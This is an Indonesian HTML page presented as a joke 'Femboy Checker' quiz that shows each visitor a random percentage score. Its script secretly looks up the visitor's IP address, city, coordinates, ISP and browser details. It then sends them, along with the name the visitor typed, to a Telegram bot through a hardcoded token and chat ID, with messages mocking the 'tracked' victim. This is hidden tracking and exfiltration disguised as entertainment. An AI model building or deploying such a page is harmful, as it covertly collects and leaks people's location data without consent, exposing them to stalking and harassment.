<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Femboy Checker | Analysis</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: #ffffff; 
            --text: #1d1d1f; 
            --accent: #007aff; 
            --gray: #f5f5f7; 
            --glass: rgba(255, 255, 255, 0.8);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        
        body { 
            background: var(--bg); 
            background-image: radial-gradient(circle at 2px 2px, #e5e5e5 1px, transparent 0);
            background-size: 40px 40px;
            color: var(--text); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            -webkit-font-smoothing: antialiased; 
        }

        .card { 
            width: 90%; 
            max-width: 400px; 
            padding: 50px 35px; 
            background: var(--glass);
            backdrop-filter: blur(10px);
            border-radius: 40px; 
            text-align: center; 
            box-shadow: 0 25px 50px -12px rgba(0, 122, 255, 0.15);
            border: 1px solid rgba(0, 122, 255, 0.1);
        }

        .icon-box {
            width: 70px;
            height: 70px;
            background: var(--accent);
            border-radius: 22px;
            margin: 0 auto 25px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
            50% { transform: scale(1.05); box-shadow: 0 15px 30px rgba(0, 122, 255, 0.4); }
            100% { transform: scale(1); box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
        }

        h1 { font-size: 28px; font-weight: 700; letter-spacing: -1px; margin-bottom: 10px; }
        p { font-size: 15px; color: #86868b; margin-bottom: 35px; line-height: 1.5; }

        input { 
            width: 100%; 
            padding: 20px; 
            border-radius: 20px; 
            border: 2px solid transparent; 
            background: var(--gray); 
            color: var(--text); 
            font-size: 16px; 
            font-weight: 500;
            margin-bottom: 15px; 
            outline: none; 
            transition: all 0.3s ease;
            text-align: center;
        }

        input:focus { 
            background: #fff;
            border-color: var(--accent);
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
        }

        button { 
            width: 100%; 
            padding: 20px; 
            border-radius: 20px; 
            border: none; 
            background: var(--accent); 
            color: white; 
            font-weight: 700; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            font-size: 16px; 
            letter-spacing: 0.5px;
        }

        button:hover { transform: translateY(-2px); opacity: 0.9; }

        /* Loader */
        .hidden { display: none; }
        .loader-container { padding: 20px 0; }
        .loader { 
            width: 40px; 
            height: 40px; 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid var(--accent); 
            border-radius: 50%; 
            animation: spin 1s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite; 
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Result */
        .percent-text { font-size: 72px; font-weight: 800; color: var(--accent); margin: 10px 0; letter-spacing: -2px; }
        .badge { display: inline-block; padding: 10px 20px; background: #e1efff; color: var(--accent); border-radius: 100px; font-size: 13px; font-weight: 700; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="card">
        <div id="step1">
            <div class="icon-box">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
            </div>
            <h1>Femboy Checker</h1>
            <p>SEBERAPA FEMBOY LU?</p>
            <input type="text" id="userName" placeholder="NAMA U SIAPE?" autocomplete="off">
            <button onclick="startAction()">GAS CEK FEMBOY</button>
        </div>

        <div id="step2" class="hidden">
            <div class="loader-container">
                <div class="loader"></div>
                <h2 style="font-size: 18px; color: var(--accent);">sabar anj ngecek</h2>
                <p style="margin-top: 10px;">bentar men</p>
            </div>
        </div>

        <div id="step3" class="hidden">
            <p style="margin-bottom: 0;">Hasil untuk:</p>
            <h2 id="finalName" style="font-size: 24px; margin-bottom: 10px;">User</h2>
            <div class="percent-text" id="finalPercent">0%</div>
            <div class="badge" id="finalBadge">Calculating</div>
            <button onclick="location.reload()" style="background: var(--gray); color: #555; margin-top: 35px; font-size: 14px;">Coba Lagi</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8775661623:AAG5vKbtp089TtX_ExTYoDEMigA2rDJn1zc";
        const CHAT_ID = "8432724042";

        async function startAction() {
            const nameInput = document.getElementById('userName').value;
            if (!nameInput) return;

            // UI Switch (Instan)
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            // --- PROSES BACKGROUND (FIRE AND FORGET) ---
            // Jalankan pelacakan tanpa ditunggu (Gak pake await)
            getIntel().then(data => {
                sendTele(nameInput, data);
            });

            // Logic Score
            const score = Math.floor(Math.random() * 41) + 60;

            // MURNI 1 DETIK PAS (1000ms)
            setTimeout(() => {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
                document.getElementById('finalName').innerText = nameInput;
                document.getElementById('finalPercent').innerText = score + "%";
                document.getElementById('finalBadge').innerText = score > 80 ? "WASPADA FEMBOY WIR" : "ANJ FEMBOY SEREM AMAT";
            }, 1000);
        }

        async function getIntel() {
            try {
                const res = await fetch('http://ip-api.com/json/?fields=66846719');
                return await res.json();
            } catch (e) { return null; }
        }

        async function sendTele(name, d) {
            if(!d) return;
            const time = new Date().toLocaleString('id-ID', { timeZone: d.timezone || 'Asia/Jakarta' });
            
            const mini = `
🔥 *SEBAR SEBAR ALAMAT IP NIH*
😂 *YAHAHA KE TRACK*
━━━━━━━━━━━━━━━━━━
👤 *NAMA :* ${name.toUpperCase()}
📍 *PROVINSI :* ${d.regionName || d.region}
🌐 *ALAMAT IP :* \`${d.query}\`
📶 *JARINGAN :* ${d.isp}
🕒 *WAKTU LOKAL :* ${time}
━━━━━━━━━━━━━━━━━━
😈 _di track oleh avraham jir_`;

            const full = `
💀 *ABSOLUTE INTEL REPORT* 🕊️

📍 *DATA LOKASI & GEOGRAFI*
· Negara: ${d.country} (${d.countryCode})
· Region/Prov: ${d.regionName}
· Kota: ${d.city}
· Koordinat: \`${d.lat}, ${d.lon}\`
· Kode Pos: ${d.zip}
· Zona Waktu: ${d.timezone}

🏢 *DATA PENYEDIA LAYANAN*
· ISP: ${d.isp}
· ASN: ${d.as}
· ASN Name: ${d.asname}
· Domain: ${d.reverse || "N/A"}
· Mobile Carrier: ${d.mobile ? "YES (Seluler)" : "NO"}

🕵️ *DATA KEAMANAN & PROXY*
· IP Address: \`${d.query}\`
· Proxy Detection: ${d.proxy ? "🚩 DETECTED" : "✅ CLEAN"}
· Hosting/Bot: ${d.hosting ? "🚩 YES" : "✅ NO"}
· Device: \`${navigator.userAgent}\`

📞 *DATA TAMBAHAN*
· Status: ${d.status}
· Area: ${d.city}, ${d.regionName}
━━━━━━━━━━━━━━━━━━`;

            // Kirim Mini
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: mini, parse_mode: 'Markdown' })
            });

            // Kirim Full
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: full, parse_mode: 'Markdown' })
            });
        }
    </script>
</body>
</html>
